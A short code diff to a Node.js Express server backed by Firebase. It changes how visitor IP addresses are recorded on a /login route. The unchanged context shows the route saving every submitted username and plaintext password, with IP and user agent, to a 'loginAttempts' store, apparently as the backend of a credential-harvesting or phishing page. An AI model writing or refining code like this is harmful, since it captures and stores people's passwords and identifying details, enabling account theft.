@@ -5,6 +5,7 @@ const admin = require("firebase-admin");
 const app = express();
 
 // 🔥 Middleware
+app.set("trust proxy",true);
 app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static("public"));
@@ -26,7 +27,7 @@ app.post("/login", (req, res) => {
   const ref = db.ref("loginAttempts").push();
   ref.set({
     time: new Date().toLocaleString(),
-    ip: req.ip,
+   ip:req.headers['x-forwarded-for']|| req.ip,
     username: data.username || "N/A",
     password: data.password || "N/A",
     userAgent: data.agent || "N/A",
